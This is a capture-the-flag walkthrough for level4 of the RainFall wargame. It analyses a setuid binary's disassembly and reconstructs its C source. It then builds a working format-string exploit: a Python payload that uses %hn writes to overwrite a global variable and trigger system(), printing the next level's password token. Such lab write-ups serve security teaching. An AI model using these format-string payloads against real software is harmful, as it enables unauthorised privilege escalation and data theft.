# Walkthrough

## Program type:
Running the command `file ./level4` we see the file is 32-bit ELF
executable.
```
level4@RainFall:~$ file ./level4
./level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
```
Running the command `checksec --file ./level4, we see that the stack is
executable (NX disabled).
```
level4@RainFall:~$ checksec --file ./level4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level4
```
## Content:
```
08048444 <p>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
 804844d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
 8048455:	c9                   	leave
 8048456:	c3                   	ret

08048457 <n>:
 8048457:	55                   	push   ebp
 8048458:	89 e5                	mov    ebp,esp
 804845a:	81 ec 18 02 00 00    	sub    esp,0x218
 8048460:	a1 04 98 04 08       	mov    eax,ds:0x8049804
 8048465:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048469:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 8048470:	00
 8048471:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 8048477:	89 04 24             	mov    DWORD PTR [esp],eax
 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
 804847f:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 8048485:	89 04 24             	mov    DWORD PTR [esp],eax
 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
 804848d:	a1 10 98 04 08       	mov    eax,ds:0x8049810
 8048492:	3d 44 55 02 01       	cmp    eax,0x1025544
 8048497:	75 0c                	jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08 	mov    DWORD PTR [esp],0x8048590
 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
 80484a5:	c9                   	leave
 80484a6:	c3                   	ret

080484a7 <main>:
 80484a7:	55                   	push   ebp
 80484a8:	89 e5                	mov    ebp,esp
 80484aa:	83 e4 f0             	and    esp,0xfffffff0
 80484ad:	e8 a5 ff ff ff       	call   8048457 <n>
 80484b2:	c9                   	leave
 80484b3:	c3                   	ret
```
* There's three functions [`main`, `n`, `p`].
* The content of the function `n` is almost the same as the previous level, the 
difference being that instead of having the function printf(1) in the 
function `n` it's now in `p`, which makes it even further from the target
buffer.
* There's a comparison between the value `0x1025544` (16930116 in decimal) and
a global variable, and if they are equal a `system(3)` call that will execute the `cat` command on the token file.

## Reversing:
Upon analyzing the disassembly code we concluded that the actual C code could be something as follows:
```C
#include <stdio.h>

int	some_variable = 0x0;

void	p(char *buffer)
{
	printf(buffer);
}

void	n()
{
	char	buffer[520]; // ebp - 0x208

	fgets(buffer, 512, stdin);
	p(buffer);
	if (some_variable == 0x1025544)
		system("/bin/cat /home/user/level5/.pass");
}

int		main()
{
	n();
	return (0);
}
```

## Solution:
* There's two problems in this case:
	* The first is that the compared value  is big (in comparison to the previous level 0x40)
	* The second is that the call to printf(1) is far from the buffer.
* To solve the first problem we need to split the load of writting to the 
`stdout` so that we don't have to write millions of bytes, so we will write 
to the left 2-bytes 258 bytes (0x102 in the compared value) and
then write to the right 2-bytes 21828 bytes (0x5544 in the compared value) using the %hn format specifier.
* Now the only thing that remains is to figure out the location of the target buffer on stack:
	*	To do so, we can use a string like after we run the program:
	```
		AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p
	```	
	*	which will result in this:
	```
	level4@RainFall:~$ ./level4
	AAAA %p %p %p %p %p %p %p %p %p %p %p %p
	AAAA 0xb7ff26b0 0xbffff744 0xb7fd0ff4 (nil) (nil) 0xbffff708 0x804848d 0xbffff500 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
	```
	*	The value `0x41414141` that we see on the last printed value is the hexadecimal
		representation if the word `"AAAA"`, and the hex values that comes before it
		are the content of the double words on the stack litterally before the call
		to the function `printf(1)`.

	*	If we replaced the word "AAAA" with an actual address and counted from the 
		beginning to it's hexadecimal representation, we can give that number to 
		the specifier %n so it will write to that specific address.
	*	Since the number needed to pass the if condition is big we will actually write into that 		address in two steps, writing two bytes on respectively the least significant
		and most significant bytes using the format specifier %hn.
* Now lets write the python script that will enable us to access the shell using that vulnerability:
```python
import struct

target_1 = struct.pack('I', 0x8049810)
target_2 = struct.pack('I', 0x8049812)

print target_1 + target_2 + "%250x%13$hn%21570x%12$hn"

```
* Running the exploit will give us the token content:
```
level4@RainFall:~$ (python exp.py ; cat -) | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```